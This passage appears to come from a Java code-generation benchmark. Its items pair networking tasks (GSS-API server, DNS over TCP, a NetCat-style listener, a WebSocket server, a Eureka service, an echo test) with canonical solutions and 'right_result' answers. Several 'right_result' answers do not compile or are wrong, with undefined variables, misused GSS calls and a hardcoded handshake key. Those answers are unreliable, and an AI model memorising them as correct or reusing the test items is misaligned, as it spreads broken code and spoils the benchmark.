server application.\n  Input: None\n  Output: None (prints to console)\n\n- print([String msg]) -> [void] - Helper method to print messages to console.\n  Input: msg [String] - Message to print\n  Output: None (prints to console)\n\n- exit([int status]) -> [void] - Cleanly shuts down the server by closing the server socket and exiting the application.\n  Input: status [int] - Exit status code\n  Output: None (terminates application)",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport com.sun.gssapi.*;\n\nclass GSSServer {\n\n    private static ServerSocket s;\n\n    public static void main(String args[]) {\n        int port = 4444;\n\n        if (args.length < 1) {\n            usage();\n            exit(-1);\n        }\n\n        try {\n            String serviceName = args[args.length-1];\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < args.length; i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            GSSCredential server = new GSSCredential(new GSSName(serviceName,\n                GSSName.NT_HOSTBASED_SERVICE), GSSCredential.INDEFINITE,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n            s = new ServerSocket(port);\n\n            while (true) {\n                Socket c = s.accept();\n                processClient(server, c);\n            }\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static void processClient(GSSCredential server, Socket client)\n            throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(new BufferedInputStream(client.getInputStream()));\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        int tokLen = dis.readInt();\n        byte []inTok = new byte[tokLen];\n        dis.readFully(inTok, 0, inTok.length);\n\n        GSSContext aCtxt = new GSSContext(server);\n\n        do {\n            byte []outTok = aCtxt.accept(inTok, 0, inTok.length);\n\n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok);\n            }\n\n            if (aCtxt.isEstablished())\n                break;\n\n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n\n        exchangeWithPeer(aCtxt, dis, dos);\n        aCtxt.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis,\n            DataOutputStream dos) throws GSSException, IOException {\n        int len = dis.readInt();\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        MessageProp mInfo = new MessageProp();\n\n        aCtxt.unwrap(dis, bos, mInfo);\n\n        mInfo.setQOP(0);\n        mInfo.setPrivacy(false);\n\n        byte []peerTok = bos.toByteArray();\n        byte []toPeer = aCtxt.getMIC(peerTok, 0, peerTok.length, mInfo);\n\n        dos.writeInt(toPeer.length);\n        dos.write(toPeer);\n        dos.close();\n    }\n\n    private static void usage() {\n        print(\"\\nUsage:\\tGSSServert [-mech 1.2.34] [-port port] serviceName\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.security.auth.Subject;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport org.ietf.jgss.GSSContext;\nimport org.ietf.jgss.GSSCredential;\nimport org.ietf.jgss.GSSManager;\nimport org.ietf.jgss.GSSName;\nimport org.ietf.jgss.Oid;\n\npublic class GSSServer {\n    private ServerSocket s;\n\n    public static void main(String[] args) {\n        GSSServer server = new GSSServer();\n        try {\n            String serviceName = \"server\";\n            int port = 12345;\n            Oid mechOid = null;\n\n            for (int i = 0; i < args.length; i++) {\n                if (\"-port\".equals(args[i])) {\n                    port = Integer.parseInt(args[++i]);\n                } else if (\"-mech\".equals(args[i])) {\n                    mechOid = new Oid(args[++i]);\n                } else {\n                    serviceName = args[i];\n                }\n            }\n\n            LoginContext lc = new LoginContext(serviceName);\n            lc.login();\n\n            server.s = new ServerSocket(port);\n            server.print(\"Server started on port \" + port);\n\n            while (true) {\n                Socket client = server.s.accept();\n                server.processClient(lc.getSubject().getPrivateCredentials(GSSCredential.class).iterator().next(), client);\n            }\n        } catch (IOException | LoginException e) {\n            e.printStackTrace();\n        } finally {\n            server.exit(0);\n        }\n    }\n\n    private void processClient(GSSCredential server, Socket client) {\n        try (\n            InputStream is = client.getInputStream();\n            OutputStream os = client.getOutputStream();\n            DataInputStream dis = new DataInputStream(is);\n            DataOutputStream dos = new DataOutputStream(os)\n        ) {\n            GSSManager manager = GSSManager.getInstance();\n            GSSName serverName = manager.createName(\"server@localhost\", GSSName.NT_HOSTBASED_SERVICE);\n            GSSContext context = manager.createContext(serverName.canonicalize(mechOid), mechOid, server, GSSContext.DEFAULT_LIFETIME);\n            context.requestMutualAuth(true);\n            context.requestConf(true);\n            context.requestInteg(true);\n\n            byte[] token = new byte[0];\n            do {\n                token = context.initSecContext(token, 0, token.length);\n                if (token != null) {\n                    dos.write(token);\n                    dos.flush();\n                    token = dis.readFully();\n                }\n            } while (!context.isEstablished());\n\n            this.exchangeWithPeer(context, dis, dos);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis, DataOutputStream dos) {\n        try {\n            String message = dis.readUTF();\n            this.print(\"Received: \" + message);\n            dos.writeUTF(\"Response: \" + message.toUpperCase());\n            dos.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void usage() {\n        System.out.println(\"Usage: java GSSServer [-port <portNumber>] [-mech <mechanismOID>] <serviceName>\");\n    }\n\n    private void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private void exit(int status) {\n        try {\n            if (this.s != null) {\n                this.s.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}\n```"
  },
  {
    "Task_id": 529,
    "Instruction": "Task Description: Implement a Java class for handling DNS connections using TCP sockets, including server listening, client connection, message sending/receiving, and resource cleanup.\n\nClass Description: The DNSConnection class provides functionality for establishing and managing TCP-based DNS connections. It supports both server-side (incoming) and client-side (outgoing) connections, message transmission with length prefixing, and proper resource management.\n\nAttributes:\n- PORT: [int] - Constant defining the DNS port (53)\n- MAX_MSG_LEN: [int] - Maximum allowed message length (65535)\n- listener: [ServerSocket] - Server socket for incoming connections\n- socket: [Socket] - Current active socket connection\n- msgBytes: [byte[]] - Buffer for received message data\n- msgLen: [int] - Length of the current message\n- in: [BufferedInputStream] - Input stream for reading data\n- out: [OutputStream] - Output stream for writing data\n- lenBuf: [byte[]] - Buffer for message length prefix (2 bytes)\n\nMethods:\n- listen(): [void] -> [void] - Starts listening for incoming connections on the DNS port\n- stopListening(): [void] -> [void] - Stops the server socket from listening\n- openIncoming(): [void] -> [void] - Accepts an incoming client connection\n- open(InetAddress server): [void] -> [void] - Opens a connection to a DNS server\n- send(byte[] msgBytes): [void] -> [void] - Sends a message with length prefix\n- receive(boolean wait): [byte[]] -> [byte[]] - Receives a message (optionally waiting)\n- close(): [void] -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic final class DNSConnection {\n\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 0xFFFF;\n    protected static ServerSocket listener;\n    protected Socket socket;\n    protected byte[] msgBytes;\n    protected int msgLen;\n    protected BufferedInputStream in;\n    protected OutputStream out;\n    protected final byte[] lenBuf = new byte[2];\n\n    public DNSConnection() {}\n\n    public static void listen() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) == null) {\n            try {\n                listener = new ServerSocket(PORT);\n            } catch (SecurityException e) {\n                throw new SocketException(\"SecurityException: listen()\");\n            }\n        }\n        curListener = null;\n    }\n\n    public static void stopListening() {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            listener = null;\n            try {\n                curListener.close();\n            } catch (IOException e) {}\n            curListener = null;\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            try {\n                Socket socket = curListener.accept();\n                BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n                this.out = socket.getOutputStream();\n                this.in = in;\n                this.msgBytes = null;\n                this.socket = socket;\n                return;\n            } catch (SecurityException e) {}\n        }\n        throw new SocketException(curListener == null ? \"Not listening\" : \"SecurityException: accept()\");\n    }\n\n    public void open(InetAddress server) throws NullPointerException, IOException {\n        server.hashCode();\n        try {\n            Socket socket = new Socket(server, PORT);\n            BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n            this.out = socket.getOutputStream();\n            this.in = in;\n            this.socket = socket;\n        } catch (SecurityException e) {\n            throw new SocketException(\"SecurityException: connect(\" + server.getHostAddress() + \")\");\n        }\n        this.msgBytes = null;\n    }\n\n    public void send(byte[] msgBytes) throws NullPointerException, IOException {\n        int msgLen;\n        if ((msgLen = msgBytes.length) >= MAX_MSG_LEN)\n            msgLen = MAX_MSG_LEN;\n        OutputStream out;\n        if ((out = this.out) == null)\n            throw new SocketException(\"Connection closed\");\n        byte[] lenBuf = this.lenBuf;\n        lenBuf[0] = (byte)(msgLen >> 8);\n        lenBuf[1] = (byte)msgLen;\n        out.write(lenBuf, 0, 2);\n        out.write(msgBytes, 0, msgLen);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        byte[] msgBytes;\n        int msgLen, len;\n        BufferedInputStream in;\n        if ((in = this.in) == null)\n            throw new SocketException(\"Connection closed\");\n        if ((msgLen = this.msgLen) <= 0)\n            msgLen = 0;\n        if ((msgBytes = this.msgBytes) == null) {\n            do {\n                if (!wait && in.available() <= 0)\n                    return null;\n                else if ((len = in.read()) < 0)\n                    throw new EOFException();\n                else if (msgLen <= 0)\n                    this.msgLen = msgLen = len + 1;\n                else break;\n            } while (true);\n            if ((msgLen = ((msgLen - 1) << 8) | len) <= 0)\n                msgLen = 0;\n            this.msgBytes = msgBytes = new byte[msgLen];\n            msgLen = 0;\n        }\n        for (int avail; (len = msgBytes.length - (this.msgLen = msgLen)) > 0; msgLen += len)\n            if (!wait && (avail = in.available()) < len && (len = avail) <= 0)\n                return null;\n            else if ((len = in.read(msgBytes, msgLen, len)) < 0)\n                throw new EOFException();\n        this.msgBytes = null;\n        this.msgLen = 0;\n        return msgBytes;\n    }\n\n    public void close() {\n        Socket socket;\n        if ((socket = this.socket) != null) {\n            this.socket = null;\n            this.in = null;\n            this.out = null;\n            this.msgBytes = null;\n            try {\n                socket.close();\n            } catch (IOException e) {}\n            socket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class DNSConnection {\n    private static final int PORT = 53;\n    private static final int MAX_MSG_LEN = 65535;\n    private ServerSocket listener;\n    private Socket socket;\n    private byte[] msgBytes;\n    private int msgLen;\n    private BufferedInputStream in;\n    private OutputStream out;\n    private byte[] lenBuf;\n\n    public void listen() throws IOException {\n        listener = new ServerSocket(PORT);\n    }\n\n    public void stopListening() throws IOException {\n        if (listener != null && !listener.isClosed()) {\n            listener.close();\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        socket = listener.accept();\n        initializeStreams(socket);\n    }\n\n    public void open(InetAddress server) throws IOException {\n        socket = new Socket(server, PORT);\n        initializeStreams(socket);\n    }\n\n    private void initializeStreams(Socket socket) throws IOException {\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n        lenBuf = new byte[2];\n    }\n\n    public void send(byte[] msgBytes) throws IOException {\n        this.msgBytes = msgBytes;\n        msgLen = msgBytes.length;\n        out.write((msgLen >>> 8) & 0xFF);\n        out.write(msgLen & 0xFF);\n        out.write(msgBytes);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        if (wait) {\n            while (in.read(lenBuf) == -1) {\n                // Wait until data is available\n            }\n        } else {\n            if (in.read(lenBuf) == -1) {\n                return null; // No data available\n            }\n        }\n        msgLen = ((lenBuf[0] & 0xFF) << 8) | (lenBuf[1] & 0xFF);\n        msgBytes = new byte[msgLen];\n        in.readFully(msgBytes);\n        return msgBytes;\n    }\n\n    public void close() throws IOException {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n        if (in != null) {\n            in.close();\n        }\n        if (out != null) {\n            out.close();\n        }\n        if (listener != null && !listener.isClosed()) {\n            listener.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 531,
    "Instruction": "Task Description: Create a Java class that implements a simplified NetCat-like TCP server using ServerSocket for client-server communication, with WebSocket support for real-time interaction.\n\nClass Description: The NetCat class is a WebSocket plugin that creates a TCP server listening on a specified port, accepts client connections, and enables bidirectional communication between server and client through input/output streams.\n\nAttributes:\nport: [int] - The port number on which the server listens for client connections\nserver: [ServerSocket] - The ServerSocket instance used to accept client connections\nclient: [Socket] - The Socket instance representing the connected client\npool: [ExecutorService] - Thread pool for handling client communication\nos: [OutputStream] - Output stream for sending data to the client\npw: [PrintWriter] - Buffered writer for sending data to the client\n\nMethods:\ncheck: [Map param] -> [boolean] - Validates if the specified port is valid (>= 10000)\nbefore: [void] -> [void] - Initializes the ServerSocket and starts listening for connections\nlisten: [void] -> [void] - Accepts incoming client connections and sets up I/O streams\necho: [void] -> [void] - Continuously reads and displays data received from the client\nstart: [void] -> [Object] - Main execution loop that sends user input to the client\nonClose: [void] -> [void] - Cleans up resources by closing sockets and shutting down threads",
    "Canonical_solution": "import com.trackray.base.annotation.Plugin;\nimport com.trackray.base.annotation.Param;\nimport com.trackray.base.annotation.Rule;\nimport com.trackray.base.plugin.WebSocketPlugin;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\n@Plugin(value = \"netcat\", title = \"NetCat \u7b80\u6613\u7248\" , author = \"\u6d45\u84dd\")\n@Rule(params = {@Param(key = \"port\",defaultValue = \"10010\" , desc = \"\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u5c3d\u91cf\u907f\u514d\u5c0f\u4e8e10000\u7684\u7aef\u53e3\"),},\n        sync = true,  websocket = true )\npublic class NetCat extends WebSocketPlugin {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    @Override\n    public boolean check(Map param) {\n        port = Integer.parseInt(param.get(\"port\").toString());\n        return port >= 10000;\n    }\n\n    @Override\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newSingleThreadExecutor();\n            println(\"port:\"+port);\n            println(\"\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\");\n            listen();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void listen() {\n        try {\n            client = server.accept();\n            if (client.isConnected()){\n                println(\"\u5ba2\u6237\u7aef\u5df2\u8fde\u63a5:\"+client.getInetAddress().getHostAddress());\n                os = client.getOutputStream();\n                pw = new PrintWriter(os, true);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        pool.execute(() -> {\n            while (true){\n                echo();\n            }\n        });\n    }\n\n    private void echo() {\n        try {\n            if (client.isConnected()){\n                InputStream is = client.getInputStream();\n                BufferedReader bri = new BufferedReader(new InputStreamReader(is));\n                String temp;\n                while ((temp = bri.readLine())!=null && !\"\".equals(temp)) {\n                    println(temp);\n                }\n            }\n        }catch (Exception e){\n            println(e.getMessage());\n        }\n    }\n\n    @Override\n    public Object start() {\n        while (client!=null && client.isConnected()){\n            String input = getInput();\n            if (StringUtils.isNotBlank(input)){\n                pw.println(input);\n            }\n        }\n        println(\"\u4e3b\u673a\u5df2\u4e0b\u7ebf\");\n        return null;\n    }\n\n    @Override\n    public void onClose() {\n        try {\n            pool.shutdownNow();\n            if (client!=null && !client.isClosed())\n            {\n                client.close();\n            }\n            server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class NetCat {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    public boolean check(Map<String, Object> param) {\n        return (Integer)param.get(\"port\") >= 10000;\n    }\n\n    public void before() throws IOException {\n        this.port = (Integer)param.get(\"port\");\n        this.server = new ServerSocket(this.port);\n        this.pool = Executors.newCachedThreadPool();\n    }\n\n    public void listen() throws IOException {\n        this.client = this.server.accept();\n        this.os = this.client.getOutputStream();\n        this.pw = new PrintWriter(new OutputStreamWriter(this.os));\n    }\n\n    public void echo() throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(this.client.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n\n    public Object start() throws IOException {\n        this.before();\n        this.listen();\n        this.pool.submit(() -> {\n            try {\n                this.echo();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        BufferedReader userInput = new BufferedReader(new InputStreamReader(System.in));\n        String inputLine;\n        while ((inputLine = userInput.readLine()) != null) {\n            this.pw.println(inputLine);\n            this.pw.flush();\n        }\n        return null;\n    }\n\n    public void onClose() {\n        try {\n            this.pw.close();\n            this.os.close();\n            this.client.close();\n            this.server.close();\n            this.pool.shutdown();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 532,
    "Instruction": "Task Description: Create a WebSocket server class in Java that handles WebSocket connections, performs WebSocket handshake, and sends binary frames to clients.\n\nClass Description: The WebSocketServer class implements a basic WebSocket server that listens for incoming connections, performs the WebSocket handshake protocol, and sends binary data frames to connected clients. It supports configurable masking and frame size.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket used to listen for incoming connections\n- port: int - The port number on which the server listens for connections\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server by creating and binding the server socket\n- handleConnection() -> void - Handles an incoming connection, performs WebSocket handshake, and sends binary frames\n- stop() -> void - Stops the server by closing the server socket\n\nThe class should:\n1. Accept incoming TCP connections\n2. Parse WebSocket handshake headers\n3. Generate proper handshake response\n4. Create and send binary frames with configurable masking and size\n5. Properly close connections and clean up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\nimport org.java_websocket.util.Charsetfunctions;\nimport org.java_websocket.util.KeyUtils;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.framing.BinaryFrame;\nimport java.nio.ByteBuffer;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n    }\n\n    public void handleConnection() throws IOException, InterruptedException {\n        Socket client = serverSocket.accept();\n        Scanner in = new Scanner(client.getInputStream());\n        String input;\n        String seckey = \"\";\n        String testCase;\n        boolean useMask = false;\n        int size = 0;\n        OutputStream os = client.getOutputStream();\n\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                os.write(Charsetfunctions.asciiBytes(\n                    \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\"\n                        + KeyUtils.getSecKey(seckey) + \"\\r\\n\"));\n                os.flush();\n                Thread.sleep(10);\n                Draft_6455 draft_6455 = new Draft_6455();\n                BinaryFrame binaryFrame = new BinaryFrame();\n                binaryFrame.setPayload(ByteBuffer.allocate(size));\n                binaryFrame.setTransferemasked(useMask);\n                ByteBuffer byteBuffer = draft_6455.createBinaryFrame(binaryFrame);\n                byte[] bytes = byteBuffer.array();\n                int first = size / 2;\n                os.write(bytes, 0, first);\n                os.flush();\n                Thread.sleep(5);\n                os.write(bytes, first, bytes.length - first);\n                os.flush();\n                break;\n            }\n            if (input.startsWith(\"GET \")) {\n                testCase = input.split(\" \")[1];\n                String[] strings = testCase.split(\"/\");\n                useMask = Boolean.valueOf(strings[1]);\n                size = Integer.valueOf(strings[2]);\n            }\n        }\n        client.close();\n    }\n\n    public void stop() throws IOException {\n        serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"WebSocket server started on port \" + port);\n    }\n\n    public void handleConnection() throws IOException {\n        Socket clientSocket = serverSocket.accept();\n        InputStream input = clientSocket.getInputStream();\n        OutputStream output = clientSocket.getOutputStream();\n\n        // Perform WebSocket handshake\n        BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n        PrintWriter writer = new PrintWriter(output, true);\n\n        StringBuilder request = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null && !line.isEmpty()) {\n            request.append(line).append(\"\\r\\n\");\n        }\n        if (!request.toString().contains(\"Upgrade: websocket\")) {\n            throw new IOException(\"Invalid WebSocket handshake request\");\n        }\n\n        // Send handshake response\n        String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                           \"Upgrade: websocket\\r\\n\" +\n                           \"Connection: Upgrade\\r\\n\" +\n                           \"Sec-WebSocket-Accept: dGhlIHNhbXBsZSBub25jZQ==\\r\\n\\r\\n\";\n        output.write(response.getBytes());\n        output.flush();\n\n        // Send binary frame\n        byte[] data = {0x00, 0x01, 0x02, 0x03};\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        buffer.put((byte) 0x82); // FIN bit set, opcode 0x02 (binary)\n        buffer.put((byte) data.length);\n        buffer.put(data);\n        output.write(buffer.array());\n        output.flush();\n\n        // Close connection\n        clientSocket.close();\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n            System.out.println(\"WebSocket server stopped\");\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            WebSocketServer server = new WebSocketServer(8080);\n            server.start();\n            server.handleConnection();\n            server.stop();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 533,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to handle client connections, process incoming requests, and send responses. The server should integrate with Eureka service discovery and manage its lifecycle through initialization and cleanup.\n\nClass Description: ExampleServiceBase is a singleton class that acts as a TCP server, listening on a specified port for client connections. It processes incoming requests by reading input from clients and sending back responses with a timestamp. The class integrates with Eureka service discovery to register its availability.\n\nAttributes:\n- applicationInfoManager: [ApplicationInfoManager] - Manages the service instance information for Eureka registration\n- eurekaClient: [EurekaClient] - Handles communication with the Eureka service discovery server\n\nMethods:\n- ExampleServiceBase([ApplicationInfoManager, EurekaClient]) -> [void] - Constructor that initializes the Eureka-related dependencies\n- start() -> [void] - Initializes the service by setting its status to UP in Eureka and starts listening for client connections on the registered port\n- processRequest([Socket]) -> [void] - Processes an incoming client connection by reading the request, generating a response with current timestamp, and sending it back to the client",
    "Canonical_solution": "import com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\n@Singleton\npublic class ExampleServiceBase {\n\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n\n    @Inject\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                            EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    @PostConstruct\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        \n        try {\n            int myServingPort = applicationInfoManager.getInfo().getPort();\n            ServerSocket serverSocket = new ServerSocket(myServingPort);\n            final Socket s = serverSocket.accept();\n            processRequest(s);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(final Socket s) {\n        try {\n            BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            String line = rd.readLine();\n            if (line != null) {\n                System.out.println(\"Received a request from the example client: \" + line);\n            }\n            String response = \"BAR \" + new Date();\n            System.out.println(\"Sending the response to the client: \" + response);\n\n            PrintStream out = new PrintStream(s.getOutputStream());\n            out.println(response);\n\n        } catch (Throwable e) {\n            System.err.println(\"Error processing requests\");\n        } finally {\n            if (s != null) {\n                try {\n                    s.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class ExampleServiceBase {\n    private static final ExampleServiceBase INSTANCE = new ExampleServiceBase();\n    private ApplicationInfoManager applicationInfoManager;\n    private EurekaClient eurekaClient;\n    private ServerSocket serverSocket;\n\n    private ExampleServiceBase(ApplicationInfoManager applicationInfoManager, EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    public static ExampleServiceBase getInstance() {\n        return INSTANCE;\n    }\n\n    public void start(int port) throws IOException {\n        applicationInfoManager.setInstanceStatus(com.netflix.appinfo.InstanceInfo.InstanceStatus.UP);\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started on port \" + port);\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(() -> processRequest(socket)).start();\n        }\n    }\n\n    private void processRequest(Socket socket) {\n        try (\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)\n        ) {\n            String request = reader.readLine();\n            String response = generateResponse(request);\n            writer.println(response);\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String generateResponse(String request) {\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        return \"Received: \" + request + \" at \" + sdf.format(new Date());\n    }\n}\n```"
  },
  {
    "Task_id": 536,
    "Instruction": "Task Description: Demonstrate basic TCP socket communication between a server and client using Java's ServerSocket and Socket classes. The server should echo back any data received from the client.\n\nFunction Description: The function establishes a TCP server that listens on port 5678, accepts a client connection, reads data from the client, writes the same data back (echo), and then closes the connection. Simultaneously, it creates a client that connects to this server, sends a test message, and verifies the echoed response.\n\nInput: None (The function uses hardcoded values for demonstration purposes)\n\nOutput: None (The function performs communication internally and handles errors through fail() calls)\n\n---\n\nNote: Since the reference code shows a complete test scenario (both server and client) implemented as a single function with internal threading rather than separate reusable components, I've described it at the function level. If you'd prefer this to be split into proper class definitions for Server and Client components, please let me know and I can provide that alternative structure instead.",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic void testServerSocketCommunication() {\n    Thread listener = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            ServerSocket s = null;\n            try {\n                s = new ServerSocket(5678);\n            } catch (IOException e) {\n                fail(\"exception creating ServerSocket\");\n            }\n\n            byte[] recv = new byte[800];\n\n            Socket peer = null;\n            try {\n                peer = s.accept();\n            } catch (IOException e) {\n                fail(\"accept failed\");\n            }\n\n            InputStream is = peer.getInputStream();\n            OutputStream os = peer.getOutputStream();\n\n            int recvLen = 0;\n            try {\n                recvLen = is.read(recv);\n            } catch (IOException e) {\n                fail(\"read failed\");\n            }\n\n            try {\n                os.write(recv, 0, recvLen);\n            } catch (IOException e) {\n                fail(\"write failed\");\n            }\n\n            try {\n                peer.close();\n                s.close();\n            } catch (IOException e) {\n                fail(\"close failed\");\n            }\n        }\n    });\n    listener.start();\n\n    Socket s = null;\n    try {\n        s = new Socket();\n        s.bind(new InetSocketAddress(\"192.168.0.3\", 0));\n    } catch (IOException e) {\n        fail(\"new socket failed\");\n    